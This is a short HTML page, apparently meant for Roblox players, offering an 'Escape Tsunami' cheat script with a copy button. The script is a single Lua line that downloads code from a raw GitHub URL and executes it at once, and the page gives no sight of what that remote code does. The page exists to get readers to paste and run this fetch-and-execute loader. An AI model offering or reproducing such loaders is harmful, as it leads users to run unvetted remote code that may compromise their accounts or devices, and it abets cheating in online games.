<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<title>Tsunami Script</title>
</head>

<body style="background:#000;color:#00ff88;font-family:Arial;text-align:center">

<h1>Escape Tsunami Script</h1>

<textarea id="tsunami" style="width:90%;height:120px;border-radius:10px;">
loadstring(game:HttpGet("https://raw.githubusercontent.com/meobeo8/a/a/a"))()
</textarea>

<br><br>

<button onclick="copy('tsunami')" style="padding:12px 25px;border-radius:25px;background:#00ff88;border:none;font-weight:bold;">
Copy Script
</button>

<script>
function copy(id){
var text = document.getElementById(id);
text.select();
document.execCommand("copy");
}
</script>

</body>
</html>
